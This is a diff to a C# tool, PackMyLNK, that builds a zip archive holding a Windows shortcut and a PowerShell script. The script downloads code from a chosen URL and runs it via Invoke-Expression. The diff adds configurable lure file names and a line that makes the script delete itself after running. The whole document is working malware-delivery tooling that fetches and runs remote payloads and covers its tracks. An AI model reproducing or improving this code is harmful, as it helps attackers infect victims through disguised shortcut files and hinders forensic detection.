@@ -5,17 +5,44 @@ class Program
 {
     static void Main(string[] args)
     {
-        if (args.Length < 2)
+        if (args.Length < 6)
         {
-            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL>");
+            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL> -Lnk <LNK_FILE> -Zip <ZIP_file>");
             return;
         }
 
-        string url = args[1];
+        string url = null;
+        string lnkName = null;
+        string zipFile = null;
+
+        for (int i = 0; i < args.Length; i++)
+        {
+            if (args[i] == "-Url" && i + 1 < args.Length)
+            {
+                url = args[i + 1];
+            }
+            else if (args[i] == "-Lnk" && i + 1 < args.Length)
+            {
+                lnkName = args[i + 1];
+            }
+            else if (args[i] == "-Zip" && i + 1 < args.Length)
+            {
+                zipFile = args[i + 1];
+            }
+        }
+
+        if (url == null || lnkName == null || zipFile == null)
+        {
+            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL> -Lnk <LNK_FILE> -Zip <ZIP_file>");
+            return;
+        }
+
         string curDir = AppDomain.CurrentDomain.BaseDirectory;
-        string lnkFilePath = Path.Combine(curDir, "Readme.lnk");
+        string lnkFilePath = Path.Combine(curDir, lnkName + ".lnk");
         string ps1FilePath = Path.Combine(curDir, "backup.txt");
-        string zipFilePath = Path.Combine(curDir, "Readme.zip");
+        string zipFilePath = Path.Combine(curDir, zipFile + ".zip");
+
+        Console.ForegroundColor = ConsoleColor.Cyan;
 
         Console.WriteLine(@"
   _____           _    __  __       _      _   _ _  __
@@ -26,14 +53,13 @@ class Program
  |_|   \__,_|\___|_|\_\_|  |_|\__, |______|_| \_|_|\_\
                                __/ |                  
                               |___/                   
-    calfcrusher@inventati.org
+ 
+A simple .zip packer for LNK files - calfcrusher@inventati.org
         ");
 
-
-        Console.WriteLine("PackMyLNK - A simple .zip packer for LNK files");
+        Console.ResetColor();
         Console.WriteLine();
-        Console.WriteLine();
-        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";
+        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content));Remove-Item $MyInvocation.MyCommand.Definition -Force";
 
         File.WriteAllText(ps1FilePath, psContent);
 
@@ -44,7 +70,7 @@ class Program
         CreateZip(zipFilePath, new[] { lnkFilePath, ps1FilePath });
 
         Console.ForegroundColor = ConsoleColor.Green;
-        Console.WriteLine("ZIP file created: " + zipFilePath);
+        Console.WriteLine("[+] ZIP file created: " + zipFilePath);
         Console.ResetColor();
 
 
